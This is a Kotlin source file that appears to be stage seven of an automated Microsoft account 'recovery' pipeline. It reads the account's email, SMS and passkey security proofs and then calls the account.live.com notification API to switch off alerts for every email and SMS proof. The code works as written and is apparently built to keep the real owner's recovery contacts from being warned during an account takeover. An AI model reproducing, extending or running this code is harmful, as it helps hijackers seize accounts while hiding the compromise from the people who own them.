package microsoft.recovery.stages

import io.ktor.client.call.body
import io.ktor.client.request.get
import io.ktor.client.request.header
import io.ktor.client.request.post
import io.ktor.client.request.setBody
import io.ktor.client.statement.bodyAsText
import io.ktor.http.ContentType
import io.ktor.http.contentType
import io.ktor.http.isSuccess
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.delay
import microsoft.recovery.context.RecoveryContext
import microsoft.recovery.model.GenericCanaryResponse
import microsoft.recovery.model.NotificationProofDetail
import microsoft.recovery.model.RecoveryResult
import microsoft.recovery.model.RecoveryStage
import microsoft.recovery.model.SetUserNotificationStateRequest
import microsoft.recovery.model.StageExecution
import microsoft.recovery.util.MicrosoftHttpClientFactory
import microsoft.recovery.util.RecoveryParsers

class Stage7Suppression(
    private val stageDelayMs: Long = 1000L,
) : RecoveryStageHandler {

    override suspend fun execute(
        context: RecoveryContext,
        stageListener: StageListener?,
    ): StageExecution<Unit> = try {
        val freshProofsResponse = context.httpClient.get("https://account.live.com/proofs/manage/additional") {
            header("X-Requested-With", "XMLHttpRequest")
        }
        val freshProofsData = RecoveryParsers.extractManageProofsData(freshProofsResponse.bodyAsText(), MicrosoftHttpClientFactory.json)
        val initialProofs = context.proofsData
        val emailProofs = freshProofsData?.emailProofs ?: initialProofs?.emailProofs.orEmpty()
        val smsProofs = freshProofsData?.smsProofs ?: initialProofs?.smsProofs.orEmpty()
        val passKeyIds = freshProofsData?.passKeyIds ?: initialProofs?.passKeyIds.orEmpty()
        context.emailProofs = emailProofs
        context.smsProofs = smsProofs
        context.passKeyIds = passKeyIds
        if (!freshProofsData?.apiCanary.isNullOrBlank()) {
            context.activeCanary = freshProofsData.apiCanary
        }

        var activeCanary = context.activeCanary
        var suppressedCount = 0
        val targetProofs = emailProofs + smsProofs

        for (proof in targetProofs) {
            val suppressionResponse = context.httpClient.post("https://account.live.com/API/Proofs/SetUserNotificationState") {
                contentType(ContentType.Application.Json)
                header("canary", activeCanary)
                setBody(
                    SetUserNotificationStateRequest(
                        proofDetails = listOf(
                            NotificationProofDetail(
                                name = proof.name,
                                notificationEnabled = false,
                                type = proof.type,
                            ),
                        ),
                        uaid = context.uaid,
                    ),
                )
            }

            if (!suppressionResponse.status.isSuccess()) {
                val msg = "Notification suppression failed for proof ${proof.name}: HTTP ${suppressionResponse.status.value}"
                stageListener?.invoke("7", "Notification Suppression", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.NOTIFICATION_SUPPRESSION, msg))
            }

            val finalPath = suppressionResponse.call.request.url.encodedPath
            if (finalPath != "/API/Proofs/SetUserNotificationState") {
                val msg = "Notification suppression failed for proof ${proof.name}: redirected to unexpected path $finalPath"
                stageListener?.invoke("7", "Notification Suppression", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.NOTIFICATION_SUPPRESSION, msg))
            }

            val canaryResponse = runCatching { suppressionResponse.body<GenericCanaryResponse>() }.getOrNull()
            val newCanary = canaryResponse?.apiCanary
            if (newCanary.isNullOrBlank()) {
                val errorDetail = canaryResponse?.error?.message ?: canaryResponse?.error?.code ?: "missing apiCanary in response"
                val msg = "Notification suppression failed for proof ${proof.name}: $errorDetail"
                stageListener?.invoke("7", "Notification Suppression", false, msg)
                return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.NOTIFICATION_SUPPRESSION, msg))
            }

            activeCanary = newCanary
            suppressedCount++

            if (stageDelayMs > 0) delay(stageDelayMs)
        }

        context.suppressedCount = suppressedCount
        context.activeCanary = activeCanary
        stageListener?.invoke("7", "Notification Suppression", true, "$suppressedCount proofs disabled")
        StageExecution.Success(Unit)
    } catch (e: CancellationException) {
        throw e
    } catch (e: Exception) {
        val msg = "Notification suppression failed: ${e.message}"
        stageListener?.invoke("7", "Notification Suppression", false, msg)
        StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.NOTIFICATION_SUPPRESSION, msg, cause = e))
    }
}
